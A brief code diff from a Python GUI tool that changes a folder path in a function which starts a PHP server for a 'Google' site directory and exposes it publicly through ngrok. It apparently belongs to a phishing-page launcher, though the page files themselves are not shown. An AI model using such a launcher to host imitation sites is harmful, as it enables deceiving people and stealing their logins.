@@ -117,7 +117,7 @@ def startserver():
 
         status.insert('end',"----------------------------\n")
         status.insert(INSERT,"[+] Starting PHP Server...!\n")
-        os.system("cd ~/sites/Google && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
+        os.system("cd ~/sites/google && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
         os.system("sleep 2")
         status.insert('end',"[+] Starting NGROK Server for Google..\n")
         out = os.system("ngrok http 5555 > /dev/null 2>&1 &")
